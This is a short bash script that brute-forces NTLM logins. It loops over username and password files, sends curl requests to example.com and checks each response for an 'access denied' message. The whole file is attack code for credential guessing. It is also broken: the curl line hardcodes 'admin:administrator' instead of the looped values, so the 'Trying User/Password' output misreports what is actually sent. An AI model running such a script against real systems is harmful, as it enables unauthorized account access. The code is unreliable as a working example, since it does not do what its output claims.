#!/bin/bash

count=0
for a in `cat $2`
do
 for b in `cat $1`
  do
  output=`curl https://example.com -k --ntlm --user admin:administrator -s | grep "Unauthorized: Access is denied due to invalid credentials."`

        let count=count+1
	echo "Trying User:$b,Password:$a,Try:$count"
	if [[ $output =~ "Access is denied" ]]
	then
	 echo "Access is Denied"
	else
	 echo "Something else"
         exit 1
	fi

done
done

